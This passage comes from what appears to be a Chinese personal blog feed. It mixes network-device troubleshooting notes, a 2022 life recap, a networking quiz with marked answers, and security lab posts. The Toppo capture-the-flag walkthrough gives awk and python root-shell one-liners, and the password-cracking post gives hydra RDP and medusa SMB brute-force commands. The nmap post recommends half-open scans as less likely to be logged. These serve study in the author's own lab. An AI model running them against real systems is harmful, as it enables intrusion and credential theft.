如果高峰期卡则，检查会话数是否过高。</p><p>⑤  直连光猫测速。</p><p>⑥  升级设备版本。</p><p>⑦  如果是某个特定网址打不开直连光猫可以则将网址地址解析出来写静态路由（也可以写一条所有ip访问所有ip的策略路由）</p><h3 id="无线信号搜不到"><a href="#无线信号搜不到" class="headerlink" title="无线信号搜不到"></a>无线信号搜不到</h3><p>①   确定wifi信号的频段如：设备是eap201设置的wifi信号为单频5g信号</p><p>②   Wifi名称是否有特殊字符尽量避免</p><p>③   Wifi名称改为全英文进行测试，如：win7系统无法识别中文的wifi名称。</p><p>④   如果wifi是中文的电脑也不是win7无法搜到wifi，则可以把编码方式从utf-8改为GBK进行测试。（编码方式只有中文wifi才有） </p><p>⑤   关闭无线设置高级设置的多余功能</p><p>⑥   更改加密方式为wpa2-psk</p><p>⑦   查看wifi密码是否超出了16位（本地管理界面无法超出16位，macc无线配置wifi密码可以超过16位）</p><p>⑧   如果设备有上云则在macc—无线配置里面查看是否删除了射频，如果删除了需要手动添加。</p><p>⑨   升级版本，重置设备。</p><h3 id="网桥桥接不成功、摄像头不同"><a href="#网桥桥接不成功、摄像头不同" class="headerlink" title="网桥桥接不成功、摄像头不同"></a>网桥桥接不成功、摄像头不同</h3><ol><li>网桥桥接不成功：</li></ol><p>a)   确认网桥型号是否完全一致   问全型号</p><p>b)   是否超出一对多数量</p><p>c)   桥接距离是否过远，建议2-3米进行桥接</p><p>d)   确保网桥之前是否有遮挡</p><p>e)   调整网桥信道后重新桥接</p><p>f)    周围是否有干扰比如基站，高压线，信号塔等。</p><p>g)   重置网桥重新桥接</p><ol start="2"><li>网桥接摄像头，摄像头不同：</li></ol><p>a)   确保网桥桥接正常</p><p>b)   在网桥的ap端ping cpe端查看是否正常，是否有丢包，如果有丢包则调整信道，频宽进行测试，周围是否有干扰比如基站，高压线，信号塔等。</p><p>c)   是否超出网桥带摄像头的带机量，或网桥的极限传输距离（小睿哥搜索est参数）</p><p>d)   在网桥ping摄像头ip看是否可以ping同，如果不通则检查摄像头的ip配置是否正确或者线路是否正确。</p><p>e)   在网桥ping录像机ip看是否可以ping同，如果不通则检查录像机的ip配置是否正确或者线路是否正确。</p><p>网桥卡：摄像头卡一会有一会没有，进网桥管理界面看干扰，延迟，（信号塔，电磁波），网桥。</p><h3 id="自组网不成功"><a href="#自组网不成功" class="headerlink" title="自组网不成功"></a>自组网不成功</h3><p>自组网功能，选出主设备，别的设备同步密码</p><p>①  检查未组网设备是否能与我们的设备组网（只有之前讲过的设备型号可以组网）</p><p>②  如果是ap没有组网则检查是否超出路由器管理ap的数量，如果没有路由器则检查是否超出路由器。</p><p>③  检查设备是否开启自组网功能。  wifi列表中有没有-s信号</p><p>④  检查设备获取的地址是否是同一网段，如果不是同一网段则需要在地址池设备上下发option43参数指定主设备进行三层组网（下发地址的设备不是EG设备的情况下，EG下发不同网段的地址不会影响自组网）。上联不是同一个网段</p><p>⑤  交换机是否开启端口隔离功能，开启端口隔离会影响设备组网。</p><p>⑥  检查未组网设备的版本是否过低。</p><p>例如客户超出设备量，可以说这边帮你查询了一下，设备支持管理的ap数量是32，如果ap数量超过这个量会导致设备无法组网，不能统一管理，但能配置，如果想统一管理需要上诺克云。</p><h3 id="ap离线"><a href="#ap离线" class="headerlink" title="ap离线"></a>ap离线</h3><ol><li>本地离线：</li></ol><p>①  Ap离线首先要观察指示灯状态</p><p>②  指示灯不亮：检查供电，如果是poe供电则检查交换机供电电源是否为48v，ap的受电电压都是标准的poe供电48v，如果电压匹配则检查网线是否正常，或有没有超出交换机供电的总功率。如果设备是dc供电则检查dc供电器的电源供电是否符合ap的供电标准（面板ap不支持dc供电）具体受电电压去睿易官网查询。</p><p>③  指示灯慢闪：慢闪分为两种情况1.设备未上云2.设备未获取到地址。</p><p>Ap本地离线指示灯慢闪代表为获取到地址，按照获取不到地址排查。</p><p>注：路由器线路不通，检查路由器，通则检查交换机(检查DHCP snooping 设置信任端口环路)等</p><p>④  指示灯快闪：设备供电问题或者是重置重启途中，等待一段时间如果还有这快闪则检查供电问题，或者重置设备进行测试。</p><h3 id="漫游切换异常"><a href="#漫游切换异常" class="headerlink" title="漫游切换异常"></a>漫游切换异常</h3><ol><li>漫游粘滞：</li></ol><p>①  首先要确认设备的wifi名称密码是否一致，wifi名称密码必须一致这是漫游的前提条件。</p><p>②  加密类型修改为wpa2-psk</p><p>③  不同Ap发出是wifi是否在不同网段，如果不同网段需要rap四位数的设备才能实现，eap不支持三层漫游。</p><p>④  如果同网段则关闭无线设置–高级设置不支持的功能</p><p>⑤  减小设备功率，增大漫游灵敏度</p><p>⑥  在macc开启漫游网优</p><p>⑦  升级ap版本</p><ol start="2"><li>漫游切换频繁：</li></ol><p>①  加密类型修改为wpa2-psk</p><p>②  如果同网段则关闭无线设置–高级设置不支持的功能</p><p>③  增大设备功率，减小漫游灵敏度</p><p>④  在macc关闭漫游网优</p><p>⑤  升级ap版本</p><h2 id="咨询公式"><a href="#咨询公式" class="headerlink" title="咨询公式"></a>咨询公式</h2><p>开头语：<strong>您好，锐捷，请问有什么可以帮您？</strong></p><p>回拨话术：<strong>您好，锐捷，抱歉让您久等了，您的问题帮您确定了一下</strong></p><p>掉电：<strong>您好，锐捷，抱歉让您久等了，看到有一个XXX设备的问题需要处理一下</strong></p><p>结束语：<strong>好的，那我这边就先不打扰您了，祝您生活愉快，再见</strong></p> <br /> <p>故障单：</p><p>问题没解决：</p><p>客户：<strong>我在观察看看吧</strong></p><p>我：<strong>好的，那这边您看什么时候给您回访下比较合适</strong></p><p>客户：<strong>都行或者明天</strong></p><p>我：<strong>好的，那明天我给您回访下，那我这边就先不打扰您了，祝您生活愉快，再见</strong></p> <br /><p>问题解决：</p><p>客户：<strong>客户表示已经好了</strong></p><p>我：<strong>您看您对本次服务是否还满意呢</strong></p><p>客户：<strong>满意</strong></p><p>我：<strong>那稍后会有个按键评价，辛苦您评价一下</strong></p><p>客户：<strong>好的</strong></p><p>我：<strong>辛苦您不要挂机，马上帮您转接，祝您生活愉快，再见</strong></p> <br /><p>回访话术：</p><p>我：<strong>您好，锐捷，抱歉打扰您了，咱之前的XXXX问题怎么样了</strong></p><p>客户：<strong>已经好了</strong></p><p>我：<strong>好的，请问您对之前的服务是否还满意吗</strong></p><p>客户：<strong>满意</strong></p><p>我：<strong>那有其他问题的话，辛苦您随时联系，稍后会有有个按键评价辛苦您评价下</strong></p><p>客户：<strong>好的</strong></p><p>我：辛<strong>苦您不要挂机，马上帮您转接，祝您生活愉快，再见</strong></p><p>没解决的：</p><p>我：<strong>您好，锐捷，抱歉打扰您了，咱之前的XXXX问题怎么样了</strong></p><p>客户：<strong>还是有问题</strong></p><p>我：<strong>好的，那您看什么时间在帮您处理下</strong></p><p>客户：<strong>具体时间  明天下午</strong></p><p>我：<strong>好的，那我这边帮您反馈下相关同事，之后他会给您回电的</strong></p><p>客户：<strong>好的</strong></p><p>我：<strong>那我这边就不打扰您了，祝您生活愉快，再见</strong></p><br /><br />]]></content>
      
      
      <categories>
          
          <category> 学习资料 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年度总结</title>
      <link href="/posts/4c6a"/>
      <url>/posts/4c6a</url>
      
        <content type="html"><![CDATA[<br /><p><img src="/images/%E6%91%84%E5%BD%B1%E7%85%A7%E7%89%87/baotuquan01.jpg"></p><p>✍😑对于2022年来说粗略想了一下，感觉没什么好说的事情了</p><p>这一年过的着实有些岁静了</p><p>对于总结我更喜欢称之为一些美好小时刻，记录到互联网的大脑里</p><h3 id="一月至五月"><a href="#一月至五月" class="headerlink" title="(一月至五月)"></a>(一月至五月)</h3><p>快过年了，年味渐渐变浓  抓拍于1月21日</p><div class="gallery">    <div class="fj-gallery  data" data-rowHeight="220" data-limit="10">      <span class="gallery-data">[{"url":"/images/年度总结/202203.jpg)![](/images/年度总结/202205.jpg","alt":""},{"url":"/images/年度总结/202204.jpg","alt":""}]</span>    </div>    <button class="gallery-load-more">      <span>加载更多</span>      <i class="anzhiyufont anzhiyu-icon-arrow-down"></i>    </button>    </div><p><strong>重组的</strong><del>工作台</del><strong>小桌面</strong>    拍摄于4月<img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/202202.jpg"></p><p>赏析：《得猫於近村以雪儿名之戏为作诗》 ——宋·陆游<br>似虎能缘木，如驹不伏辕。但知空鼠穴，无意为鱼餐😺</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/202206.jpg" alt="school cat"></p><p>南山，南山，南山南，后加书院书香气十足🤪<img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/202207.jpg"></p><p>高度不一样嗅到的空气也不一样 。好兄弟爬杠猛得一批👍 抓拍于5月<img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/202208.jpg"></p><h3 id="（六月至十二月）"><a href="#（六月至十二月）" class="headerlink" title="（六月至十二月）"></a>（六月至十二月）</h3><p>6月份记忆最深的是和哥们去看小型车展🚎</p><p>对于7月份来说是打卡赶海园，捕到个寂寞，跟预想不太一样🐙</p><p>8月份去社区参加志愿者社会实践服务，受益匪浅</p><p>9月去考计算机二级，压线过🤪</p><p>10月份打卡博物馆，此贴更多详情<a href="https://www.zsss.cf/2022/10/09/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/">点击进入</a>………..</p><p>12月因为疫情原因跑路回家开启网课模式，日常摸鱼，获取到了知识的缺失😷</p><p>……先这样吧目前想到的就这么多了ing…..</p><br /><div class="gallery">    <div class="fj-gallery  data" data-rowHeight="220" data-limit="10">      <span class="gallery-data">[{"url":"/images/年度总结/t1.jpg","alt":""},{"url":"/images/年度总结/t2.jpg","alt":""},{"url":"/images/年度总结/t3.jpg","alt":""},{"url":"/images/年度总结/t4.jpg","alt":""},{"url":"/images/年度总结/t5.jpg","alt":""},{"url":"/images/年度总结/t6.jpg","alt":""},{"url":"/images/年度总结/t7.jpg","alt":""},{"url":"/images/年度总结/t8.jpg","alt":""}]</span>    </div>    <button class="gallery-load-more">      <span>加载更多</span>      <i class="anzhiyufont anzhiyu-icon-arrow-down"></i>    </button>    </div><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>去他媽的2022！！！</p><p>至于已经发生了的事情，过去了就过去吧，毕竟还得要过完当下，平常心平常心😕</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Topoo靶机漏洞挖掘</title>
      <link href="/posts/51495"/>
      <url>/posts/51495</url>
      
        <content type="html"><![CDATA[<br /><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>靶机：toppo </li><li>攻击机：Kali GNU&#x2F;Linux Rolling</li></ul><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>i</strong>. 查询一下靶机地IP地址      </p><p> <img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/01.jpg">                  </p><p><strong>ii</strong>. 探测一下靶机运行了那些服务</p><p><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/02.jpg"></p><p><strong>iii</strong>. 检测网站：</p><p><code>http://192.168.23.21:80</code>发现没有漏洞可利用</p><p><strong>iv</strong>.网站目录中有一个敏感信息地文件，找到该文件</p><p><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/03.jpg"><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/04.jpg"></p><p><strong>v</strong>. 尝试登录ssh</p><p><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/05.jpg"><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/06.jpg"></p><p><strong>vi</strong>. 尝试读取&#x2F;root&#x2F;flag文件，获取文件中的信息，将提权检测脚本传到靶机并提权检测 。</p><p><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/07.jpg" alt="kali利用python创建临时web服务器"><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/08.jpg" alt="登录靶机，下载脚本并执行"><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/09.jpg"></p><p><font size="2">直接执行&#x2F;usr&#x2F;bin&#x2F;awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’提升至root权限或者调用python -c “import os;os.setuid(0);os.system(‘&#x2F;bin&#x2F;bash’)”</font><img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/10.jpg"></p><p><strong>vii</strong>.      使用字典枚举破解root密码<img src="/images/Toppo%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98/11.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali之破解主机密码</title>
      <link href="/posts/22280"/>
      <url>/posts/22280</url>
      
        <content type="html"><![CDATA[<br /><h2 id="项目1"><a href="#项目1" class="headerlink" title="项目1"></a>项目1</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li><p><font face='宋体'>VMware Workstation Pro</font></p></li><li><p><font face="隶书">靶机：Windows 7 </font></p></li><li><p><font face="隶书">攻击机：Kali GNU&#x2F;Linux Rolling x86_64 </font></p></li></ul><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><font face='黑体'>kali：<code>192.168.23.11</code>windows：<code>192.168.23.12</code></font></p><p><font face='隶书'>系统用户已知为<code>administrator</code></font></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>I</strong>.<em>开启远程桌面服务（3389端口）并关闭防火墙</em>。</p><p><font face='黑体'>过程略</font></p><p><strong>II</strong>.<em>使用nmap工具扫描windows10远程端口是否开放</em></p><p><font face="黑体"><code>nmap -p 3389 [要扫描的ip地址范围]</code></font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/03.jpg"></p><p><strong>III</strong>.<em>生成密码字典（可以使用Crunch或John等工具生成），为后面使用hydra工具做破解准备</em>。</p><p><font face='黑体'>过程略</font></p><p><strong>IV</strong>.<em>输入以下命令破解</em></p><p>方法1：<code>hydra -l [windows的账户名] -P [密码字典] rdp://[ip地址]</code></p><p><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/04.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">2</span>：</span><br><span class="line">┌──(root㉿kali)-[/]</span><br><span class="line">└─<span class="comment"># medusa -M smbnt -h 192.168.23.12 -u administrator -P cc.txt -f</span></span><br><span class="line">-h：要爆破的目标主机IP地址 <span class="number">192.168</span><span class="number">.56</span><span class="number">.132</span></span><br><span class="line">-l：要爆破的用户名 Administrator</span><br><span class="line">-P：要爆破的密码字典 /cc.lst</span><br><span class="line">-M：调用smbnt模块执行</span><br><span class="line">-f：一旦爆破成功一个就立即停止爆破</span><br></pre></td></tr></table></figure><p><strong><font face='黑体'>破解时间跟密码复杂程度相关.全凭运气</font></strong></p><p><strong><font face="隶书">只用于学习交流，切勿用于非法途径!!!</font></strong></p><br /><br /><h2 id="项目2"><a href="#项目2" class="headerlink" title="项目2"></a>项目2</h2><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>​<font face='隶书'>压缩文件如果忘记密码就需要使用暴力破解的方法进行破解，因为使用了加密的手段，是无法绕过密码验证的。</font></p><p><font face='隶书'> cRARk是一款开源的功能强大的rar，7z类压缩软件的破解工具，支持GPU加速<a href="https://www.crark.net/">官网地址</a>。<br> 目前有命令行版本和windows的GUI版本。crark55版本（rar用）、crark7z-20版本（zip用）</font></p><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><p> <strong>I</strong>.<font face="黑体">解压官方的crark55的压缩包。解压的时候会提示需要解压密码，其实只是rar压缩包中的“crackme”需要解压密码（crackme不解压出也完全不影响软件的使用），其它文件都是没有加密的。用鼠标左键选中其它未加密的文件拖动，至我新建的文件夹。</font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/05.jpg"></p><p><strong>II</strong>.<font face="黑体">双击“driver-timeout.reg”文件并安装，据说是使用GPU解密时用到的注册表文件。</font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/06.jpg"></p><p><strong>III</strong>.<font face="黑体">添加环境变量，进入<em>patk</em>编辑环境变量页面后，鼠标左键点击在右上方的“新建”按钮，点击新建后，左下方会有输入光标闪烁，在内输入crark所在的文件夹地址，例：<code>E:\ceshi\crark</code>。</font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/07.jpg"></p><p><strong>IV</strong>.<font face="黑体">为了方便，我把示例的被加密文件rar也放入了crark软件所在的文件夹内。</font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/08.jpg" alt="的"></p><p> <strong>V</strong>.<font face="黑体">双击打开“cRARk.exe”可以看到软件命令符的介绍。</font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/09.jpg" alt="的"></p><p><strong>VI</strong>. <font face="黑体">Crark文件夹内，文件结尾为“.def”的是密码规则文件以“def”为例，打开“englishi.def”文件可以看到，每一行前都有“#”，这里的“#”是注释的作用，意思是“#”开头的这一行都是不起作用的。这样就开始按照自己制定的规则开始破解密码了。</font><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/10.jpg" alt="都"><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/11.jpg" alt="的"><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/12.jpg" alt="的"><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/13.jpg" alt="都"><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/14.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">-l1  指的是最小密码长度为1个字符</span><br><span class="line">-g10    指的是最长密码为10个字符</span><br><span class="line">-p”englishi.def”   指的是按照englishi.def里的规则破解密码</span><br><span class="line">-n0 指的是用独显进行破解密码（如果有多个独立显卡，可能为-n1、-n2等，）</span><br><span class="line">1234.rar 指的是要破解的加密压缩包</span><br></pre></td></tr></table></figure><p><font face="隶书">提示：12700H的默认最大破解速度是700个密码每秒，默认使用4个线程。独显3060的默认最大速度是52000个密码每秒，显卡占用100%。Crark这款软件是我用过的软件中最快的一款，速度很好！但是面对低配的笔记本和8位数以上的多类型组合密码还是显得力不从心。</font></p><br /><br /><p>【<strong>参考</strong>文章】项目1：【<a href="https://www.cnblogs.com/codemariosec/p/15729580.html">codeMario|Blog</a>】</p><p>【<strong>转载</strong>文章】项目2：【<a href="https://yof.cc/2022/97/crark/">YOF的博客</a>】</p>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap端口扫描</title>
      <link href="/posts/29114"/>
      <url>/posts/29114</url>
      
        <content type="html"><![CDATA[<br /><h2 id="Nmap简介"><a href="#Nmap简介" class="headerlink" title="Nmap简介"></a>Nmap简介</h2><p><font face="隶书">Nmap（Network Mapper，网络映射器）是一款开放源代码的网络探测和安全审核工具，俗称扫描器之王。它的设计目标是快速地扫描大型网络，那些主机提供什么服务（应用程序名和版本），那些服务运行在什么操作系统（包括版本信息），它们使用什么类型的报文过滤器&#x2F;防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。</font></p><h2 id="Nmap功能"><a href="#Nmap功能" class="headerlink" title="Nmap功能"></a>Nmap功能</h2><ul><li><font face="黑体">检测存活在网络上的主机（主机发现）</font></li><li><font face="黑体">检测主机上开放的端口（端口发现或枚举）</font></li><li><font face="黑体">检测到相应端口（服务发现）的软件和版本</font></li><li><font face="黑体">检测操作系统，硬件地址，以及软件版本</font></li><li><font face="黑体">检测脆弱性的漏洞（Nmap的脚本）</font></li></ul><p><img src="/images/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/01.png"><img src="https://cdn.dyblogs.cn//20200512113824.png"><img src="https://cdn.dyblogs.cn//20200512114105.png" alt="nmap端口扫描神器"><img src="https://cdn.dyblogs.cn//20200512144257.png" alt="nmap端口扫描神器"></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><strong>跳过Ping扫描阶段</strong>（<code>无ping扫描</code>）</p><p><font face="华文中宋">在默认情况下Nmap在进行其他扫描之前，Nmap都会对目标进行一个Ping扫描。如果目标禁止了Ping，那么Nmap发出的Ping扫描就不会有反应。在接不到如何结果返回的情况下，Nmap就会直接结束整个扫描过程，如果是这样，扫描结果是不准确的。如果遇到这种情况，我们可以使用-P0或-PN参数，启用无Ping扫描，跳过Ping扫描这个过程。如<code>图1-1</code></font><img src="/images/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/03.png"><em>图1-1</em></p><p><strong>仅使用Ping协议进行主机发现</strong></p><p><font face="华文中宋">与<code>图1-1</code>无Ping扫描正好相反，有的时候我们需要快速扫描大量主机。这个时候我们就可以加参数-sP，加了这个参数Nmap就会仅使用Ping协议进行扫描。虽然这样会有部分主机扫描结果不准确，但相比于整个数量，这部分主机我们可以忽略，加了这个参数后速度会非常快。使用什么样的参数，要根据需求，要有取舍，要速度必然会牺牲准确性。如<code>图1-2</code>_</font><img src="/images/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/04.png"><em>图1-2</em></p><p><strong>使用ARP协议进行主机发现</strong></p><p><font face="华文中宋">ARP协议扫描只适用于局域网内，使用ARP，不仅速度快，而且结果也会更加准确。如<code>图1-3</code></font><img src="/images/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/02.png"><em>图1-3</em></p><p><strong>半开扫描和全开扫描</strong></p><p><font face="隶书">注：半开扫描和全开扫描与TCP连接的三次握手有关系，所谓三次握手就是建立TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。这3个包的发送过程，类似于我们打电话，首先自我介绍，然后对方介绍，最后问好，3个过程全部完成叫全开扫描；最后一步不做，叫半开扫描。在实际过程中，半开扫描应用的最多，半开扫描不容易被目标电脑日志记录。</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">半开扫描：nmap -sS 192.168.152.130</span><br><span class="line">全开扫描：nmap -sT 192.168.152.130</span><br></pre></td></tr></table></figure><p><strong>识别操作系统</strong></p><p><font face="隶书">注：Nmap不仅能扫描IP还能扫描端口，同时Nmap还可以识别操作系统的类型。因为系统不一样，渗透的方法就不同，linux系统和Windows系统有区别，安卓系统和苹果系统有区别，所以识别出是什么系统还是非常重要的。</font><img src="/images/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/05.jpg"></p><p><strong>扫描全部端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p <span class="string">&quot;*&quot;</span> 192.168.152.154</span><br></pre></td></tr></table></figure><p><strong>扫描指定端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 192.168.152.154</span><br></pre></td></tr></table></figure><br /><br /><p>【参考文章】</p><p>【1】<a href="https://dyblogs.cn/dy/2226.html">大雁博客</a></p><p>【2】<a href="https://baijiahao.baidu.com/s?id=1685740265393716845&wfr=spider&for=pc">Baidu 百度|张老师的IT训练营</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络技术大赛SDN训练题库</title>
      <link href="/posts/21871"/>
      <url>/posts/21871</url>
      
        <content type="html"><![CDATA[<br /><p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B47.jpg"></p><br /><p style="text-align:center;color:#FF00FF;font-size:1.5em;font-weight: bold;">未经本人允许，禁止转载<br /><br /><h3 id="题库列表"><a href="#题库列表" class="headerlink" title="题库列表"></a><font color="green" style="background: linear-gradient( to right, #ff1616, #ff7716, #ffdc16, #36c945, #10a5ce, #0f0096, #a51eff, #ff1616);">题库列表</font></h3><ol><li><em>传统网络</em></li><li><em>SDN</em></li><li><em>云网络</em></li></ol><br /><br /><h4 id="传统网络"><a href="#传统网络" class="headerlink" title="传统网络"></a><font face="黑体" size=6><strong>传统网络</strong></font></h4><p>1.计算机网络体系结构中，下层的目的是向上一层提供（ ）。</p><p>A、协议</p><p><font style="background: yellow ">B、服务</font></p><p>C、规则</p><p>D、数据包</p><p>2.建立计算机网络的主要目的是__和__。（ ）</p><p>A、提高运行速度、数据通信</p><p>B、增加内存容量、数据通信</p><p>C、提高计算精度、提高运行速度</p><p><font style="background: yellow ">D、数据通信、共享资源</font></p><p>3.根据计算机网络的覆盖范围，可以把网络划分为三大类，以下不属于其中分类的是（ ）。</p><p>A、广域网</p><p>B、城域网</p><p>C、局域网</p><p><font style="background: yellow ">D、宽带网</font></p><p>4.在OSI参考模型的各层次中，（ ）的数据传送单位是数据帧。</p><p>A、物理层</p><p><font style="background: yellow ">B、数据链路层</font></p><p>C、网络层</p><p>D、传输层</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：传输层——数据段（Segment），网络层——分组（Packet），数据链路层——数据帧（Frame），物理层——比特（Bit）</span><br></pre></td></tr></table></figure><p>5.在下列网间连接器中，在数据链路层实现网络互连的是（ ）。</p><p>A、中继器</p><p><font style="background: yellow ">B、网桥</font></p><p>C、路由器    </p><p>D、网关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：网桥（Bridge）像一个聪明的中继器。中继器从一个网络电缆里接收信号，放大它们，将其送入下一个电缆。相比较而言，网桥对从关卡上传下来的信息更敏锐一些。网桥是一种对帧进行转发的技术，根据MAC分区块，可隔离碰撞。网桥将网络的多个网段在数据链路层连接起来。</span><br></pre></td></tr></table></figure><p>6.以下关于OSI参考模型的描述中，错误的是（ ）。</p><p>A、物理层利用传输介质实现比特流的传输</p><p><font style="background: yellow ">B、数据链路层使得物理线路传输无差错</font></p><p>C、网络层实现路由选择、分组转发、流量与拥塞控制等功能</p><p>D、传输层可以提供可靠的端到端通信服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：数据链路层通过差错控制，和流量控制使得有差错的物理线路变成无差错的数据链路，实际上物理线路仍是有差错的。</span><br></pre></td></tr></table></figure><p>7.VLAN的划分不包括以下哪种方法（ ）。</p><p>A、基于端口</p><p>B、基于MAC地址</p><p>C、基于协议</p><p><font style="background: yellow ">D、基于物理位置</font></p><p>8.一个VLAN可以看作是一个（ ）。</p><p>A、冲突域    </p><p><font style="background: yellow ">B、广播域</font></p><p>C、管理域</p><p>D、阻塞域</p><p>9.在路由器互联的多个局域网中，通常要求每个局域网的（ 